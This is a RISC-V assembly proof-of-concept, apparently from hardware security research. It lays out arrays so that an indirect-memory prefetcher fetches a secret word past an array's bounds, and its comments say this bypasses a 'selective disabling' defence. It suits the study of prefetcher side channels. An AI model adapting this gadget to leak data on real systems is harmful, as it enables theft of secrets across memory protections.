# this program demonstrates out of bounds prefetching for an indirect array pattern prefetcher (e.g. imp)
# this can bypass selective disabling:
# leak secrets located after the array bounds, which are otherwise never accessed by the program

# this program contains an indirect_array with public values, an index_array with indices, and a secret is stored after the index_array
# the loop activates imp, prefetching ahead in the indirect pattern

# selective disabling: the program never actively accesses the secret, so selective disabling never disables the DMP here

.globl _start
.data
    .balign 16
    # arrays should be long enough to give imp time to reach its max prefetch distance (it grows by confidence)
    indirect_array: .word 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54 # array with 24 values (6 cache blocks)
    index_array: .word 10, 21, 7, 0, 15, 17, 11, 6, 16, 23, 1, 20, 8, 14, 2, 19, 5, 12, 9, 3, 18, 4, 13, 22 # array with 24 indices (6 cache blocks)
    padding: .zero 60 # 15 empty entries: a confident imp prefetches 16 entries ahead (4 cache blocks - 1 word)
    secret: .word 2148260877, 0, 0, 0, 0

.text
_start:

setup:
    # t0 = index, start at 0
    mv t0, x0
    # t1 = index_array base address
    la t1, index_array
    # t2 = array size
    li t2, 24
    # t3 = indirect_array base address
    la t3, indirect_array

# indirect array access pattern
loop:
    .rept 32
        nop
    .endr

    # t4 = index_array[index]
    slli t4, t0, 2
    add t4, t1, t4
    lw t4, 0(t4)

    # t5 = indirect_array[index_array[index]]
    slli t5, t4, 2
    add t5, t3, t5
    lw t5, 0(t5)

    # index++
    addi t0, t0, 1

    # loop end: jump to loop if index != array size
    bne t0, t2, loop

finish:
    .rept 128
        nop
    .endr
    lui ra,0x10000
    li sp,4
    sb sp,0(ra)
    .rept 64
        nop
    .endr
